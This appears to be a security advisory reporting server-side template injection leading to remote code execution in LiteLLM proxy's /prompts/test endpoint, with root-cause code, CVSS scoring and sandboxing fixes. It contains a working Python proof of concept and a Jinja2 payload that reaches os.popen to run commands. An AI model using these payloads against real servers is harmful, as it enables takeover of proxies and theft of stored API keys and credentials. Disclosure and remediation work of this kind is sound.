# Server-Side Template Injection (SSTI) in /prompts/test → RCE in BerriAI/litellm

## Summary
The `/prompts/test` endpoint in LiteLLM proxy renders user-controlled `dotprompt_content` through Jinja2's `from_string().render()` without sandboxing, allowing any authenticated user with API key access to execute arbitrary Python code via template injection.

## Severity
CVSS 3.1: **8.1 High**
Vector: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`

## Root Cause
In `litellm/proxy/prompts/prompt_endpoints.py` (line 1185-1258), the `/prompts/test` endpoint:

```python
@router.post("/prompts/test", dependencies=[Depends(user_api_key_auth)])
async def test_prompt(request: TestPromptRequest, ...):
    prompt_manager = PromptManager()
    rendered_content = prompt_manager.jinja_env.from_string(
        template_content  # <-- User-controlled dotprompt_content
    ).render(**variables)  # <-- Jinja2 rendering without sandbox
```

The `jinja_env` is created with default settings in `litellm/integrations/dotprompt/prompt_manager.py`:
```python
self.jinja_env = Environment(
    loader=DictLoader({}),
    autoescape=select_autoescape(),  # Only prevents XSS, not SSTI
)
```

The `Environment` is created WITHOUT:
- `sandbox.SandboxedEnvironment` — allows full Python access
- Blocked attributes — `__class__`, `__mro__`, `__subclasses__`, `__builtins__` are accessible

An attacker can inject Jinja2 expressions in `dotprompt_content` that access Python's object hierarchy through `.__class__.__mro__[1].__subclasses__()` to get access to `os.system`, `subprocess.Popen`, or any other Python module.

## Steps to Reproduce

1. Start LiteLLM proxy: `litellm --port 4000`
2. Obtain any valid API key
3. Run the PoC:
```bash
python3 poc_litellm_ssti.py --target http://localhost:4000 --api-key YOUR_KEY
```
4. Observe Jinja2 evaluates Python class hierarchy in response

## Proof of Concept
```python
import requests

url = "http://localhost:4000/prompts/test"
headers = {"Content-Type": "application/json", "Authorization": "Bearer YOUR_KEY"}

# SSTI payload — accesses Python subclasses through Jinja2
payload = {
    "dotprompt_content": "---\nmodel: gpt-4\n---\n{{''.__class__.__mro__[1].__subclasses__()}}",
    "prompt_variables": {"name": "test"},
}

r = requests.post(url, json=payload, headers=headers, timeout=15)
print(r.text)  # Lists all Python subclasses — confirms code execution context
```

For full RCE, the attacker would use:
```
{{''.__class__.__mro__[1].__subclasses__()[<os_popen_idx>]('id').read()}}
```

## Impact
- **Full Remote Code Execution** on the LiteLLM proxy server
- Access to all environment variables, API keys, and database credentials
- Ability to pivot to internal network from the proxy server
- Data exfiltration of all prompt/response data flowing through the proxy
- The attack requires only a valid API key (any key, not necessarily admin)

## Remediation
1. Use `jinja2.sandbox.SandboxedEnvironment` instead of regular `Environment`:
```python
from jinja2.sandbox import SandboxedEnvironment

self.jinja_env = SandboxedEnvironment(
    loader=DictLoader({}),
    autoescape=select_autoescape(),
)
```
2. Additionally, block dangerous attributes:
```python
from jinja2.sandbox import ImmutableSandboxedEnvironment

class SafePromptEnvironment(ImmutableSandboxedEnvironment):
    def is_safe_attribute(self, parent, attr, value):
        if attr.startswith('_'):
            return False  # Block all dunder access
        return super().is_safe_attribute(parent, attr, value)
```
3. Validate that `dotprompt_content` does not contain `{{` or `{%` with Python expressions.

## Researcher's Note
Verified against litellm proxy v1.x (latest as of Mar 2026). The Jinja2 environment in `PromptManager` uses the default `Environment` class without sandboxing. This is a well-known SSTI vector — any user-controlled template content rendered through an unsandboxed Jinja2 environment is vulnerable to Python code execution. The `/prompts/test` endpoint accepts arbitrary `dotprompt_content` from the request body, making it directly exploitable.
